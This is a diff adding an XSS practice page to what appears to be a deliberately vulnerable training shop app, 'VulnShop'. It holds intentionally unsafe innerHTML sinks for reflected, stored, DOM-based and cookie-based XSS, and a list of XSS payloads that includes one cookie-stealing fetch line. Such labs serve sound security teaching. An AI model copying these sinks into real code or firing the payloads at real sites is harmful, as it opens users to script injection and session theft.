@@ -1,0 +1,130 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>XSS Testing — VulnShop</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="assets/css/style.css" />
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand">VulnShop</div>
+    <nav>
+      <a href="index.html">Home</a>
+      <a href="search.html">Search</a>
+      <a href="login.html">Login</a>
+    </nav>
+  </header>
+
+  <main class="container">
+    <h1>XSS Vulnerability Testing</h1>
+    <p class="muted">This page contains multiple XSS vulnerabilities for penetration testing.</p>
+
+    <div class="card mt">
+      <h2>1. Reflected XSS</h2>
+      <p>Search parameter is reflected without proper encoding:</p>
+      <form method="GET" action="xss.html">
+        <input type="text" name="search" placeholder="Try: &lt;script&gt;alert('XSS')&lt;/script&gt;" style="width: 400px;">
+        <button type="submit">Search</button>
+      </form>
+      <div id="reflected-output" class="mt"></div>
+      <script>
+        const params = new URLSearchParams(location.search);
+        const search = params.get('search');
+        if (search) {
+          // VULNERABLE: Direct innerHTML without sanitization
+          document.getElementById('reflected-output').innerHTML = '<p>Results for: <strong>' + search + '</strong></p>';
+        }
+      </script>
+    </div>
+
+    <div class="card mt">
+      <h2>2. Stored XSS</h2>
+      <p>Comments are stored and displayed without sanitization:</p>
+      <form id="comment-form">
+        <textarea name="comment" placeholder="Try: &lt;img src=x onerror=alert('XSS')&gt;" rows="3" style="width: 100%;"></textarea>
+        <button type="submit">Post Comment</button>
+      </form>
+      <div id="comments" class="mt"></div>
+      <script>
+        // Load stored comments from localStorage
+        function loadComments() {
+          const comments = JSON.parse(localStorage.getItem('xss_comments') || '[]');
+          const container = document.getElementById('comments');
+          container.innerHTML = '<h3>Comments:</h3>';
+          comments.forEach(comment => {
+            // VULNERABLE: Stored XSS - no sanitization
+            container.innerHTML += '<div class="card mt"><p>' + comment + '</p></div>';
+          });
+        }
+        loadComments();
+        document.getElementById('comment-form').addEventListener('submit', (e) => {
+          e.preventDefault();
+          const comment = e.target.comment.value;
+          const comments = JSON.parse(localStorage.getItem('xss_comments') || '[]');
+          comments.push(comment);
+          localStorage.setItem('xss_comments', JSON.stringify(comments));
+          loadComments();
+          e.target.reset();
+        });
+      </script>
+    </div>
+
+    <div class="card mt">
+      <h2>3. DOM-based XSS</h2>
+      <p>Hash fragment is used to set content:</p>
+      <div id="dom-output"></div>
+      <script>
+        // VULNERABLE: DOM-based XSS using hash
+        const hash = location.hash.substring(1);
+        if (hash) {
+          document.getElementById('dom-output').innerHTML = '<p>Welcome, ' + decodeURIComponent(hash) + '!</p>';
+        } else {
+          document.getElementById('dom-output').innerHTML = '<p>Try: <code>#&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>';
+        }
+      </script>
+    </div>
+
+    <div class="card mt">
+      <h2>4. Cookie-based XSS</h2>
+      <p>Cookie value is displayed without encoding:</p>
+      <div id="cookie-output"></div>
+      <script>
+        // VULNERABLE: Cookie value reflected
+        function getCookie(name) {
+          const value = `; ${document.cookie}`;
+          const parts = value.split(`; ${name}=`);
+          if (parts.length === 2) return parts.pop().split(';').shift();
+        }
+        const username = getCookie('username');
+        if (username) {
+          document.getElementById('cookie-output').innerHTML = '<p>Hello, <strong>' + username + '</strong>!</p>';
+        } else {
+          document.getElementById('cookie-output').innerHTML = '<p>Set cookie: <code>document.cookie="username=&lt;script&gt;alert(1)&lt;/script&gt;"</code></p>';
+        }
+      </script>
+    </div>
+
+    <div class="card mt">
+      <h2>XSS Payload Examples</h2>
+      <ul>
+        <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+        <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
+        <li><code>&lt;svg onload=alert('XSS')&gt;</code></li>
+        <li><code>&lt;body onload=alert('XSS')&gt;</code></li>
+        <li><code>&lt;iframe src=javascript:alert('XSS')&gt;</code></li>
+        <li><code>&lt;input autofocus onfocus=alert('XSS')&gt;</code></li>
+        <li><code>&lt;details open ontoggle=alert('XSS')&gt;</code></li>
+        <li><code>&lt;marquee onstart=alert('XSS')&gt;</code></li>
+        <li><code>&lt;video&gt;&lt;source onerror=alert('XSS')&gt;</code></li>
+        <li><code>&lt;audio src=x onerror=alert('XSS')&gt;</code></li>
+        <li><code>javascript:alert(document.cookie)</code></li>
+        <li><code>&lt;script&gt;fetch('/api/steal?cookie='+document.cookie)&lt;/script&gt;</code></li>
+      </ul>
+    </div>
+  </main>
+
+  <script src="assets/js/logger.js"></script>
+  <script src="assets/js/app.js"></script>
+</body>
+</html>
